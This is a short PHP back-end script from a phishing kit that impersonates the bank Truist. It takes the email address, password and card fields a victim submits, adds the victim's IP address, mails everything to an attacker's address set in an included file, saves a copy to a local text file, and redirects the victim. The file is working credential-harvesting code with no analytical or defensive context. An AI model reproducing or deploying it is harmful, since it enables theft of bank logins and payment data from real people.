<?php
$zabi = getenv("REMOTE_ADDR");
include('email.php');
$message .= "--------------error email---------------------\n";
$message .= "E-Mail       : ".$_POST['email']."\n";
$message .= "PasWord       : ".$_POST['pass']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "---------------------------------\n";
$cc = $_POST['ccn'];
$subject = "Truist [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: KING <contact>\r\n";
mail($email,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);

$file = fopen("Z.txt", 'a');



fwrite($file, $message);


header("Location: Finish.php");
?>